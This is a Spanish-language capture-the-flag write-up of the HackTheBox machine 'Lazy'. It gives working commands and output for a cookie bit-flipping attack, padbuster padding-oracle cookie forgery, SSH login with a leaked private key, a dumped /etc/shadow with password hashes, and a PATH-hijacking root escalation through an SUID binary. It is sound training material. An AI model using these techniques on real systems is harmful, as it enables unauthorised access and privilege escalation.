---
title: "Lazy - HTB Writeup"
layout: single
excerpt: "Lazy es una máquina de dificultad media de HackTheBox. En esta máquina hemos explotado dos vulnerabilidades para ganar permisos de administrador en la web, un bit-flipping y un padding oracle attack. Para escalar privilegios hemos abusado de un path hijacking de un binario SUID con root como propietario."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/132665344-63f83f1b-4b5a-455a-9ca6-b4658a061491.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Bit-flipping
  - Padding oracle
  - Path Hijacking
  - Linux
---

![titulo](https://user-images.githubusercontent.com/67548295/132668915-4d61c736-0985-42b0-b01b-1acf416ada58.png)

# Enumeración
Como siempre empezamos enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} con la herramienta `ping`, con esto veremos el estado de la máquina y su sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ping -c 1 10.10.10.18
PING 10.10.10.18 (10.10.10.18) 56(84) bytes of data.
64 bytes from 10.10.10.18: icmp_seq=1 ttl=63 time=74.4 ms

--- 10.10.10.18 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 74.390/74.390/74.390/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el TTL, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos con la fase de reconocimiento de puertos con la herramienta `nmap`

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.18 -sC -sV -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 11:45 WEST
Nmap scan report for 10.10.10.18
Host is up (0.071s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.95 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Como vemos hay 2 puertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt - Método 1 {#metodo-1}

Comenzaremos enumerando el protocolo **HTTP** con la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $whatweb http://10.10.10.18

http://10.10.10.18 [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.18], PHP[5.5.9-1ubuntu4.21], Title[CompanyDev], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```
Como vemos hay una versión de **PHP** algo peculiar.

Tras intentar buscar **vulnerabilidades** asociadas a esta versión, no encuentro nada intersante.

Hago uso de la herramienta `gobuster` para descubrir **directorios** pero no encuentro nada interesante.

Visito la web con el navegador para ver como se compone:

![navegador1](https://user-images.githubusercontent.com/67548295/132674335-d6fe884b-e7b8-4d48-a2df-59599d9c6f61.png)

Se ve un pequeño banner y dos enlaces, uno a un panel de **login** y otro a un panel de **registro**.

Voy hasta el panel de login y pruebo diferentes **inyecciones SQL** pero ninguna funciona.

Asi que voy al panel de **registro** y creo un usuario para ver como funciona la web al estar _loggeado_:

![navegador2](https://user-images.githubusercontent.com/67548295/132691372-ecaf1e1c-a53c-45ff-a8d7-8ec0eac76117.png)

Se ve todo exactamente igual.

Una vez estuve aquí, no se me ocurrian más **vectores de ataque**, pero me dí cuenta de que todavía no había probado nada con la **cookie de sesión**

Veamos como es la **cookie**:

![navegador3](https://user-images.githubusercontent.com/67548295/132695187-b9dd82ae-b4ee-42b8-a255-d5da59a2509b.png)

No tiene pinta de ser [base64](https://marquesfernandes.com/es/tecnologia-es/que-y-base64-para-que-serve-y-como-funciona/){:target="\_blank"}{:rel="noopener nofollow"}

Suponiendo que el usuario **admin** existe, lo primero que se me viene a la cabeza es un **Bit-flipping attack**, para esto la cookie tiene que encriptada con [CBC](https://www.techopedia.com/definition/11162/cipher-block-chaining-cbc){:target="\_blank"}{:rel="noopener nofollow"}

En este escenario, el propósito de este ataque es crear un usuario con nombre **bdmin**, e ir **rotando los primeros bits de la cookie** hasta que la consigamos los bits para que en la cookie ponga **admin** en lugar de **bdmin**.

A partir de ahí copiariamos la cookie y la reemplazariamaos en el navegador para convertirnos en el usuario **admin**

Hagamos esto.

Primero creemos un usuario **bdmin**:

![image](https://user-images.githubusercontent.com/67548295/132719555-7e8745b9-c147-4c97-a0bb-ddd396e39a7c.png)

Ahora copiamos la cookie estando loggeados como **bdmin**:

![image](https://user-images.githubusercontent.com/67548295/132816509-7056940c-a699-480e-ab4d-fa4e6c37de56.png)

Luego de copiar la cookie, hacemos uso de la herramienta `burpsuite` para hacer el **bit-flipping attack**.

Abrimos el burpsuite:

![image](https://user-images.githubusercontent.com/67548295/132816970-77897282-359f-4b5f-8ba4-85f8c83fd62b.png)

Capturamos una petición de la web refrescando la misma:

![image](https://user-images.githubusercontent.com/67548295/132817267-57aa3f38-f77d-494a-a767-dbc87280cc26.png)

Enviamos la petición a la pestaña `intruder` con **ctrl + i**

Seleccionamos el ataque de tipo `sniper` y seleccionamos como target la cookie _auth_:

![image](https://user-images.githubusercontent.com/67548295/132817750-1f63fa91-f322-4c02-b490-cefcde651a91.png)

Dentro de la pestaña `intruder` nos movemos a la subpestaña _Payloads_, seleccionamos **Bit flipper** en el campo de _Payload type_ y seleccionamos la opción de _Literal Value_ dento del campo **Format of original data**:

![image](https://user-images.githubusercontent.com/67548295/132818518-c90511b2-d073-4fa2-905d-3619f0e26306.png)

Ahora en la subpestaña _options_ dentro de `intruder`, le damos a _add_ en el campo de **Grep - Extract**:

![burp](https://user-images.githubusercontent.com/67548295/132820553-8e8a5357-6ebb-4853-b674-75027709b5da.png)

Le damos a _Fetch respose_ y seleccionamos esta strings en la respuesta:

![image](https://user-images.githubusercontent.com/67548295/132820848-6f0201ad-0f9e-4a91-8164-a4ac276d7709.png)

Le damos a _Ok_, esto lo que hará es crear una [expresión regular](https://codigonaranja.com/que-son-las-expresiones-regulares-regex-o-regular-expression){:target="\_blank"}{:rel="noopener nofollow"} que en cada petición, **extraerá el valor** que se encuentre en la posición que hemos marcado. En este caso estamos buscando que esa cadena diga _You are currently logged in as **admin**_ en lugar de **bdmin**.

En este punto, le damos a _Start attack_ arriba a la derecha:

![image](https://user-images.githubusercontent.com/67548295/132822020-6489b5dc-d058-48a8-90d7-5a28e92e9e94.png)

Como vemos esta rotando los primeros bits de la cookie.

Se puede ver a la derecha que nos está extrayendo el valor que está en la posición que le hemos marcado, lo suyo sería ir mirando esta posición para ver cuando ponga **admin** en lugar de **bdmin**:

![image](https://user-images.githubusercontent.com/67548295/132823027-3e5caf79-7683-42e9-b982-e3daa6f3b1b7.png)

Se puede ver que estas 2 cookies son del usuario **admin**

Copiemos una y vamos a reemplazarla en el navegador para ver si funciona: 

![image](https://user-images.githubusercontent.com/67548295/132827379-a11d3c23-ba16-4a21-ba08-dfd428c745f4.png)

Le damos a guardar y refrescamos y...

![image](https://user-images.githubusercontent.com/67548295/132827632-0a250400-bff9-4a2b-be2c-537876e90e9c.png)

¡Estamos _loggeados_ como **admin**!

Como vemos, ha cambiado todo el dashboard, lo primero que me llama la atención es ese pequeño [hipervínculo](https://es.ccm.net/contents/239-hipervinculos){:target="\_blank"}{:rel="noopener nofollow"} con nombre `My Key`:

![image](https://user-images.githubusercontent.com/67548295/132828118-5ebd8dc6-4c94-492a-ad7a-d4ba07d45d89.png)

Accedo a él y me encuentro con una sorpresa:

![image](https://user-images.githubusercontent.com/67548295/132828311-684f0459-58f8-478e-b310-22a1cd81f7dc.png)

¡Una clave **id_rsa**!, pero claro, con qué usuario te preguntarás.

Bien, si somos atentos, en la url pone algo:

![image](https://user-images.githubusercontent.com/67548295/132828510-cafc5fe9-5e34-427f-bb77-5e2fa65daeab.png)

Buenísima, ahí esta el usuario.

Pruebo a acceder por **SSH** con la clave **id_rsa** y el usuario _Mitsos_ y lo conseguimos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $curl -s http://10.10.10.18/mysshkeywithnamemitsos --cookie "auth=FKKX1ZQFwNzZFX7PcbjdZlQOqkpiogzi" | tee id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXBZrUMa9r
upUZr2C4LVqd6+gm4WBDJj/CzAi+g9KxVGNAoT+Exqj0Z2a8Xpz7z42PmvK0Bgkk
3mwB6xmZBr968w9pznUio1GEf9i134x9g190yNa8XXdQ195cX6ysv1tPt/DXaYVq
OOheHpZZNZLTwh+aotEX34DnZLv97sdXZQ7km9qXMf7bqAuMop/ozavqz6ylzUHV
YKFPW3R7UwbEbkXXXXXXXXXXXXXXXXXXd1JV71t4avC5NNqHxUhZilni39jm/EXi
o1AC4ZKC1FqA/4YjQs4HtKv1AxwAFu7IYUeQ6QIDAQABAoIBAA79a7ieUnqcoGRF
gXvfuypBRIrmdFVRs7bGM2mLUiKBe+ATbyyAOHGd06PNDIC//D1Nd4t+XlARcwh8
g+MylLwCz0dwHZTY0WZE5iy2tZAdiB+FTq8twhnsA+1SuJfHxixjxLnr9TH9z2db
sootwlBesRBLHXilwWeNDyxR7cw5TauRBeXIzwG+pW8nBQt62/4ph/jNYabWZtji
jzSgHJIpmTO6OVERffcwK5TW/J5bHAys97OJVEQ7wc3rOVJS4I/PDFcteQKf9Mcb
+JHc6E2VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXF6jH5WyI7+RdDwsE
9sezm4OF983wsKJoTo+rrODpuI5IJjwopO46C1zbVl3oMXUP5wDHjl+wWeKqeQ2n
ZehfB7UiBEWppiSFVR7b/Tt9vGSWM6Uyi5NWFGk/wghQRw1H4EKdwWECcyNsdts0
6xcZQQKBgQCB1C4QH0t6a7h5aAo/aZwJ+9JUSqsKat0E7ijmz2trYjsZPahPUsnm
+H9wn3Pf5kAt072/4N2LNuDzJeVVYiZUsDwGFDLiCbYyBVXgqtaVdHCfXwhWh1EN
pXoEbtCvgXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXDmA==
-----END RSA PRIVATE KEY-----

┌─[z3r0byte@z3r0byte]─[~]
└──╼ $chmod 600 id_rsa && ssh -i id_rsa mitsos@10.10.10.18
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Sep  9 15:59:15 EEST 2021

  System load: 0.0               Memory usage: 5%   Processes:       194
  Usage of /:  7.6% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jan 18 10:29:40 2018
mitsos@LazyClown:~$ 
```

Una vez en este punto, podremos ver la flag **user.txt** en /home/mitsos/user.txt:

```bash
mitsos@LazyClown:~$ cat /home/mitsos/user.txt 
d558XXXXXXXXXXXXXXXXXXX3fc
```
# User.txt - Método 2

Támbien hay otra forma de conseguir privilegios de administrador en la web, y es mediante un [padding oracle attack](https://sysfatal.github.io/oracle.html)

Para esto utilizaremos la herramienta `padbuster`.

La sintaxis de esta herramienta es **muy simple**, solo hay que especificar la **url**, la muestra cifrada en **CBC** y el número de bloques del cifrado

Lo primero que hay que hacer es **iniciar sesión** con un usuario que nosotros creemos:

![image](https://user-images.githubusercontent.com/67548295/132874656-f547e9f6-0aa8-4276-a59a-fb9eb2de1f0e.png)

Una vez hemos hecho esto, copiaremos la cookie de sesión con nombre `auth`:

![image](https://user-images.githubusercontent.com/67548295/132874838-ac35ddf8-e3b9-4ac2-9bf0-8d99ed813a45.png)

Ya con estos datos podemos **lanzar** el ataque, esto lo que va a hacer es intentar **descifrar la cookie** para poder ver su valor en texto plano, a partir de ahí podemos cambiar el valor de la cookie y volverla a **encriptar** para reemplazarla en el navegador

Ahora que ya tenemos todos los datos necesarios, ya podemos comenzar el ataque:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $padbuster http://10.10.10.18 IZWWp8QRpBJFZmQYXXXXXXXXFzs4qaU 8 -cookies auth=IZWWp8QRpBJFZmXXXXXXXXX1Fzs4qaU

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 978

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (157/256) [Byte 8]
[+] Success: (61/256) [Byte 7]
[+] Success: (158/256) [Byte 6]
[+] Success: (3/256) [Byte 5]
[+] Success: (48/256) [Byte 4]
[+] Success: (11/256) [Byte 3]
[+] Success: (31/256) [Byte 2]
[+] Success: (164/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 4566641833ccf230
[+] Intermediate Bytes (HEX): 54e6f3d5f961c162
[+] Plain Text: user=pep

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (202/256) [Byte 8]
[+] Success: (9/256) [Byte 7]
[+] Success: (56/256) [Byte 6]
[+] Success: (208/256) [Byte 5]
[+] Success: (230/256) [Byte 4]
[+] Success: (155/256) [Byte 3]
[+] Success: (154/256) [Byte 2]
[+] Success: (216/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 110dd45cece2a694
[+] Intermediate Bytes (HEX): 2061631f34cbf537
[+] Plain Text: e

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=pepe

[+] Decrypted value (HEX): 757365723D7065706507070707070707

[+] Decrypted value (Base64): dXNlcj1wZXBlBwcHBwcHBw==

-------------------------------------------------------
```

He especificado **8 bloques** directamente para que sea menos tardado el proceso, pero si no lo supieramos, lo ideal seria hacer un **bucle** que vaya probando diferentes numeros de bloque, como este `for i in $(seq 1 100); do padbuster ...`

Bien, como vemos la herramienta ha logrado **descifrar la cookie**, y vale user=pepe.

Que pasaria si yo pongo `user=admin` y **encripto** ese texto como la cookie?

Probemos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $padbuster http://10.10.10.18 IZWWp8QXXXXXXXXXXXXXzs4qaU 8 -cookies auth=IZWWp8QRpBJXXXXXXXXXzs4qaU -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 978

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuXXXXXXXXXXXXXXXXXXxAAA
-------------------------------------------------------
```
Como podemos ver, hemos añadido un parámetro con nombre `-plaintext` que lo que hace **encriptar** lo que le pasemos como valor.

Nos damos cuenta de que nos ha generado una **cookie de sesión**.

La copiamos, la reemplazamos en la web y refrescamos la página:

![image](https://user-images.githubusercontent.com/67548295/132879379-218e0ced-495a-4363-b19c-3d99da4e01d1.png)

Y listo, ya seríamos usuario admin.

Para ingresar a la máquina sería de igual forma que en el [método 1](#metodo-1), habría que ingresar en el **hipervínculo** de la clave **id_rsa** y entrar por SSH.

# Root.txt

Enumerando el sistema me doy cuenta de que el directorio _home_ del usuario **Mitsos** hay un binario [SUID](https://www.ochobitshacenunbyte.com/2019/06/17/permisos-especiales-en-linux-sticky-bit-suid-y-sgid/){:target="\_blank"}{:rel="noopener nofollow"} con el usuario **root** como propietario.

Ejecutemoslo para ver que pasa:

```bash
mitsos@LazyClown:~$ ./backup 
root:$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0:17288:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17288:0:99999:7:::
landscape:*:17288:0:99999:7:::
mitsos:$6$LMSqqYD8$pqz8f/.wmOw3XwiLdqDuntwSrWy4P1hMYwc2MfZ70yA67pkjTaJgzbYaSgPlfnyCLLDDTDSoHJB99q2ky7lEB1:17288:0:99999:7:::
mysql:!:17288:0:99999:7:::
sshd:*:17288:0:99999:7:::
```
Bueno, si estás pensando en _crackear_ la contraseña de **root**, pues suerte con ello porque su contraseña es **muy compleja** y tardarías años

En su lugar, inspeccionemos un poco el binario.

Hago uso de la herramienta `strings` para que me reporte todas las cadenas de texto **imprimibles** del binario, y veo algo interesante:

```bash
mitsos@LazyClown:~$ strings backup 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
cat /etc/shadow
;*2$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
.symtab
.strtab
.shstrtab
.interp
[...]
```

Vemos una cadena interesante: `cat /etc/shadow`.

El hecho de que esté usando `cat` con la ruta relativa y no con la completa, hace que este binario sea vulnerable a un ataque llamado [Path Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/){:target="\_blank"}{:rel="noopener nofollow"}

Este ataque consiste en **alterar el path**, donde el sistema busca los binarios cuando los llamamos de forma **relativa**. Manipularíamos el path para que primero busque los binarios en un directorio que nosotros controlemos y allí crear un archivo `cat` que contenga alguna sentencia maliciosa en **bash**. 

Así, cuando ejecutemos el archivo `backup`, utilizará el `cat` malicioso que hemos creado en lugar del legítimo.

Hagamos esto.

Primero **alteraremos** el path para que primero busque los binarios en el directorio /tmp (por ejemplo):

```bash
mitsos@LazyClown:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

mitsos@LazyClown:~$ export PATH=/tmp:$PATH

mitsos@LazyClown:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Como vemos, cada ruta está separada por `:`, asi que lo que hemos hecho es poner la ruta `/tmp`: y todo el valor de path, así conseguimos que esa ruta se añada al **principio**

Ahora nos movemos al directorio `tmp` y creamos el archivo malicioso con nombre `cat`:

```bash
mitsos@LazyClown:/tmp$ echo "bash -p" > cat

mitsos@LazyClown:/tmp$ chmod +x cat
```
Yo por ejemplo he puesto `bash -p` que lo que hace es _spawnear_ una shell atendiendo a los permisos **SUID++.

Lo único que quedaria ahora es ejecutar el archivo **backup**:

```bash
mitsos@LazyClown:~$ ./backup

bash-4.3# whoami
root
```
¡y ya seríamos root! En este punto podemos visualizar la flag de root en /root/root.txt:

```bash
bash-4.3# sed '' /root/root.txt 
990bXXXXXXXXXXXXXXXXXXXXXXXXX515
```

# Resumen

En esta máquina hemos explotado 2 formas de convertirnos en usuario **admin** en la web, un **bit-flipping** y un **padding oracle attack**, accedimos a la máquina como usuario _mitsos_ a través de una clave **id_rsa** que había alojada en la web. Por último, para escalar privilegios, abusamos de un **path hijackin** en un binario **SUID** con el usuario **root** como propietario.




